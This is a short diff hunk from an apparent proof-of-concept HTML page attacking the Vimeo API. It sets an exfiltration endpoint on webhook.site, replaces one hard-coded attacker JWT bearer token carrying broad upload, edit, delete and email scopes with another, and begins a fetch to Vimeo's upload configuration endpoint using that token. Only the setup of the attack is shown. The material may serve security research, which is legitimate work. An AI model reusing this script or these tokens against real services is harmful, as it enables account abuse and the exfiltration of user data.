@@ -9,7 +9,7 @@
 
   <script>
     const exfil = "https://webhook.site/YOUR-UUID"; // Replace with your webhook endpoint
-    const attackerJwt = "jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTU4Njc1NDAsInVzZXJfaWQiOjI0NDk0MzYzNSwiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiNjYyYjU1ZjItOWVlMC00MTlhLTk4YmUtNDI0ZWUzZjk2MzE3Iiwic2giOiJhZDgyYTY4ZTRlMGZiY2U0NjgyM2I0NTM5ZmFkMjNkYzI1NjhiNDY5YjQ4NjU2MjFkNDcyMzA0YTY4ZjMxNWE0In0.ftHCR04CkpmfJWk_9miZpiGFDMD9-61Ek9p2Bns8eDw";  // Replace with a valid JWT from Burp
+    const attackerJwt = "jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTU4NjkxNjAsInVzZXJfaWQiOjI0NDk0MzYzNSwiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiYjhmYzkwM2EtYzc2OC00ODU4LWJlOTctZTJhYThiOGJmZWYxIiwic2giOiJhZDgyYTY4ZTRlMGZiY2U0NjgyM2I0NTM5ZmFkMjNkYzI1NjhiNDY5YjQ4NjU2MjFkNDcyMzA0YTY4ZjMxNWE0In0.3FM0VAy2V6w2QjA3-CEit_txZK1z97yr1k3BEo4oP2Y";  
 
     // Step 1: Call /upload/config with attacker's known JWT
     fetch("https://api.vimeo.com/upload/config", {
